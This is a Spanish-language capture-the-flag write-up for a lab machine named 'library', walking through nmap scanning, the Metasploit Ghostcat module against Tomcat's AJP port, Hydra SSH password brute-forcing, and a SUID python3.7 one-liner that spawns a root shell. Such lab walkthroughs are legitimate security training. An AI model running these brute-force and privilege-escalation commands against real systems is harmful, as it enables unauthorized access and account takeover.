---
Maquina: library
SO: Linux
Explotación: Análisis de imágenes y web
Escala_privs: Permisos sudo
Dificultad: Fácil
tags:
  - maquina
  - linux
  - escala_privs
  - ssh
  - web
  - apache_jserv
---
## Reconocimiento

1. **Explorar los puerto abiertos del docker**: 

```bash 
nmap -p- --open --min-rate 5000 -sVC -Pn 172.17.0.2
```

![[Pasted image 20241106085442.png]]

Como vemos que tiene el puerto 8080 abierto vamos a realizar una exploración web un poco precoz, a ver que logramos ver.

![[Pasted image 20241106085610.png]]

Aparece un apache tomcat 9.0.30 así que vamos a analizar subdirectorios y revisar las vulnes que pueda tener esta versión.

Por ahora he pasado dirb, gobuster y analizado código fuente (página principal) y explorado a ver si tenía posibles vulnes y nada. Así que vamos a explorar otro puerto.

Vamos a probar con el puerto 8009 que pertenece al Apache JServ, para ello vamos a utilizar la consola de metasploit y el módulo auxiliary/scanner/http/tomcat_ghostcat, este puede confirmar si tenemos acceso de lectura o incluso ejecución de código.

Los comandos ejecutados serían algo así:

```bash
msfconsole #iniciamos la consola de metasploit
search tomcat_ghostcat #Buscamos el modulo
use X #sustituir x por el modulo que toque
show options #Mirar las opciones del modulo y configurarlas segun gustos
run
```

Y tenemos la siguiente resolución ->

![[Pasted image 20241106093122.png]]

Si nos fijamos en el comentario, vemos como le saluda a un tal jerry. Así que ya tenemos un usuario para intentar hacer fuerza bruta en el SSH

```bash
hydra -l jerry -P ~/wordlists/rockyou.txt ssh://172.17.0.2 -t 16 -s 5000
```

Y sorpresita ->

![[Pasted image 20241106093304.png]]

Ya tenemos el passwd de jerry -> chocolate.

![[Pasted image 20241106093357.png]]

Parece que funciona correctamente, ahora toca ver si podemos escalar privilegios ;)

Si probamos sudo -l nos dirá que no reconoce sudo... Pero podemos probar a ver que ficheros encontramos con el bit SUID y que pertenezcan a root ->

```bash
find / -perm -4000 -user root 2>/dev/null
```

![[Pasted image 20241106100242.png]]

y si probamos con python podemos ver lo siguiente ->

```bash
./python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

![[Pasted image 20241106100302.png]]

Pasaremos a ser root ;)